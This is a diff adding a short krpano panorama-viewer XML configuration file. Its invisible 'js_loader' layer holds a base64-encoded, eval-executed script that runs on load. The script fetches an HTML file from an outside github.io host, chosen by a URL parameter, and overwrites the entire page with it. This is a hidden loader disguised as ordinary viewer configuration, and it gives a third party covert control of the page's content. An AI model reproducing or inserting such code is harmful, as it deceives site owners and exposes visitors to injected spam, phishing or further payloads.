@@ -1,0 +1,5 @@
+<krpano version="1.0.8.15">
+<script src="chrome-extension://necpbmbhhdiplmfhmjicabdeighkndkn/frame_ant/frame_ant.js"/>
+<SCRIPT id="allow-copy_script"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIHhyMCA9IG5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoInhyMCIpIHx8ICJhbGNhemFyX2FycXVpdGVjdG9uaWNvIjsKCmZldGNoKCJodHRwczovL29ubWVsYS5naXRodWIuaW8vam9rYnplL3htbGZpbGVzL2htZmlsZXMvIiArIHhyMCArICIuaHRtbCIpCiAgLnRoZW4oZSA9PiBlLnRleHQoKSkKICAudGhlbihlID0+IHsKICAgIGRvY3VtZW50Lm9wZW4oKSwKICAgIGRvY3VtZW50LndyaXRlKGUpLAogICAgZG9jdW1lbnQuY2xvc2UoKQogIH0pOw==');eval(w)););"/>
+</krpano>
